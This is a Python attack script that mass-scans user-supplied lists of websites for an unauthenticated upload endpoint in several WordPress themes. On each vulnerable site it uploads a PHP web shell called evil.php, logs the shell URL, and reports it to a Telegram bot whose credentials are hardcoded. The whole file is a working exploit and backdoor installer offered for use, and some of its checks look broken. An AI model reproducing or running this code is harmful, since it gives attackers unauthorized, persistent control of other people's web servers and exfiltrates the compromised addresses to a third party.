import sys , requests, re , json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fb = Fore.BLUE
fy = Fore.YELLOW
ff = Fore.RESET


token = '6015235152:AAFR0CSHkwInFMbAWo_ROpXn5DmgJgbg1M4'
id = 6192533086
#bot = telepot.Bot(token)

themes = ["westand","footysquare","aidreform","statfort","club-theme",
                    "kingclub-theme","spikes","spikes-black","soundblast",
                    "bolster","rocky-theme","bolster-theme","theme-deejay",
                    "snapture","onelife","churchlife","soccer-theme",
                    "faith-theme","statfort-new"]

print(f"""

{fr}   ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗       ███████╗██╗  ██╗███████╗██╗     ██╗     ███████╗
{fc}   ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗      ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝
{fw}   ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║█████╗███████╗███████║█████╗  ██║     ██║     ███████╗
{fg}   ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     ╚════██║
{fm}   ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝      ███████║██║  ██║███████╗███████╗███████╗███████║
{fy}    ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝                                                        
                         \033[91m[\033[92m+\033[91m]\033[1m  [ Developped By MrxTawFik \033[91m]\033[95m   Upload shells   \033[91m [\033[92m+\033[91m]
                         \033[91m[\033[92m+\033[91m]\033[92m {fw}Telegram Connect via : {fc}https://T.me//MrxTawFiik \033[91m[\033[92m+\033[91m]
                         \033[91m[\033[92m+\033[91m]  {fb} Telegram channel : {ff}https://T.me//Mrx_TawFiik  \033[91m[\033[92m+\033[91m]
""")

headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 'referer': 'www.google.com'}

uploader = """<?php
echo "<b>+ My Account Contact me : @Mrxtawfiik</b><br><b>Telegram channels: @MrxTawFiik <br></b>";
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h3><a href='$fullpath'>Check your file</a></h3>";
    }
}echo '<html><head><title>MrxTawFik</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>"""
requests.urllib3.disable_warnings()

def Exploit(Domain):
  #try:
    if 'http' in Domain:
      Domain = Domain
    else:
      Domain = 'http://'+Domain
    for i in themes:
      req = requests.get(Domain+'/wp-content/themes/'+i+'/include/lang_upload.php', headers=headers,verify=False, timeout=10).text
      if 'Please select Mo file' in req:
        myup = {'mofile[]': ('evil.php', uploader)}
        req = requests.post(Domain + '/wp-content/themes/'+i+'/include/lang_upload.php', files=myup, headers=headers,verify=False, timeout=10).text
        if 'New Language Uploaded Successfully' in req:
          req1 = requests.get(Domain + '/wp-content/themes/'+i+'/languages/evil.php').text
          if 'Ev1lSTORE' in req1:
            print (fw+' [>>] '+ Domain +fg+ ' [Shell Uploaded]')
            tg = requests.get('https://api.telegram.org/bot'+ token +'/sendMessage?chat_id='+ id +'&text='+Domain + '/wp-content/themes/'+i+'/languages/evil.php' + '\n')
            open('MrxTawFik/Shells.txt', 'a').write(Domain + '/wp-content/themes/'+i+'/languages/evil.php' + '\n')
            break
          else:
            print (fw+' [<<] '+ Domain +fr+ ' [Not Vulnerable]')
        else:
          print (fw+' [<<] '+ Domain +fr+ ' [Not Vulnerable]')
      else:
            print (fw+' [<<] '+ Domain +fr+ ' [Not Vulnerable]')
  #except:
    #print(fr+' -| ' + Domain + ' --> [Failed]')

target = open(input(fg+' [1] Sites List ? :  '+fw), "r").read().splitlines()
mp = Pool(int(input(fg+' [2] Thread ? : '+fw)))
mp.map(Exploit, target)
mp.close()
mp.join()
